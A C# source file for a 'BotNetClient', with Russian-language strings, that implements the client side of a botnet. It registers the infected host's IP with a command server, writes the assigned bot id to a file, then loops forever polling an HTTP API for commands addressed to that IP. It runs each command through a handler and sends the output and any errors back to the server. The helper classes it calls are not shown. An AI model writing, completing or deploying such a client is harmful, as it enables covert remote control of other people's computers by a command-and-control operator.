using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Threading;
using System.Reflection;
using Microsoft.Win32;
using System.Windows;
using System.IO;

namespace BotNetClient
{
    class Program
    {
        public static UInt32 idc;
        static void Main(string[] args)
        {
            Thread miniprogram = new Thread(new ThreadStart(SecondThread.miniprog));
            miniprogram.Start();
            string address = "192.168.0.17";
            int port = 8005;
            IPHostEntry iphostinfo = Dns.Resolve(Dns.GetHostName());
            IPAddress ipadress = iphostinfo.AddressList[0];
            List<string> apiipadress = new List<string> { };
            if (HttpHandler.Class1.ResultIPTask().Result.IndexOf(ipadress.ToString())>=0)
            {
                
            }
            else
            {
                idc = HttpHandler.Class1.CreateIpAndIdAsync(ipadress.ToString()).Result;
            }
            File.Create("путь к .txt файлу");
            File.WriteAllText("путь к .txt файлу",idc.ToString());
            #region tcp and socket code
            //IPHostEntry iphostinfo = Dns.Resolve(Dns.GetHostName());
            //IPAddress ipadress = iphostinfo.AddressList[0];
            //IPEndPoint ippoint = new IPEndPoint(ipadress, 8005);
            //Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            //TcpClient client = null;
            //string address = "192.168.0.17";
            //int port = 8005;
            //string answer = null;
            //client = new TcpClient(address, port);

            //NetworkStream stream1 = client.GetStream();
            //byte[] ipsend = new byte[100];
            //ipsend = Encoding.Unicode.GetBytes(ipadress.ToString());
            //stream1.Write(ipsend, 0, ipsend.Length);
            #endregion
            uint id = 1;
            id = HttpHandler.Class1.IdResult().Result+1;
            try
            {
                while (true)
                {
                    if(HttpHandler.Class1.IdResult().Result!=0)
                        {
                        if ((HttpHandler.Class1.GetCommandAssync<HttpHandler.Command>($"/api/v1/messages/{id - 1}").Result != null))
                        {
                            if ((HttpHandler.Class1.ResultIdCmd((id - 1).ToString()).Result == id - 1) && (HttpHandler.Class1.ResultIpCmdAsync((id - 1).ToString()).Result.IndexOf(ipadress.ToString()) >= 0))
                            {
                                string answer = HttpHandler.Class1.ResultCmd((id - 1).ToString()).Result;
                                Stopwatch watch = new Stopwatch();
                                watch.Start();
                                string message = "Ответ от " + ipadress.ToString() + " : " + handler.handl(answer) + ". Time Used: " + watch.ElapsedMilliseconds + "ms";
                                HttpHandler.Class1.SendResponse(message, ipadress.ToString());
                                watch.Stop();
                                id++;
                            }
                            else
                            {
                                id++;
                                continue;
                            }
                        }
                        else
                        {
                            continue;
                        }
                    }
                    else
                    {
                        id = 1;
                        continue;
                    }
                }
            } 
            catch (Exception ex)
            {
                HttpHandler.Class1.SendResponse(ex.ToString(), ipadress.ToString());
            }
            finally
            {
                //Process.Start(Assembly.GetExecutingAssembly().Location);
            }
        }
    }
}
